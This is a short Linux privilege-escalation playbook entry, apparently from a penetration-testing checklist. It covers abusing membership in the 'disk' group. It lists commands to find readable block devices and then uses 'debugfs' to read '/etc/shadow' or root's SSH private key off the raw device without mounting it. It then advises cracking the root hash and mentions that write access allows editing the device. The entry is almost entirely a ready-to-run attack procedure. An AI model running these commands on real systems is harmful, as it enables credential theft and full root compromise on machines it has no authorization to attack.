# LPRIV-20. Disk group read of a protected file

**Run this when:** `id` shows `disk`, or a block device is readable/writable by the current user.

```bash
id
lsblk -f 2>/dev/null || df -hT
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
```

**Look for:** a readable block device whose filesystem holds `/etc/shadow` or another target file.

**If found:** read the file with `debugfs` without mounting:

```bash
debugfs -R 'cat /etc/shadow' /dev/<DEVICE> 2>/dev/null
```

Concatenate the root hash and crack it, or read `/root/.ssh/id_rsa` the same way. `disk` is read-write; `debugfs -w` can edit, but prefer read-only first.
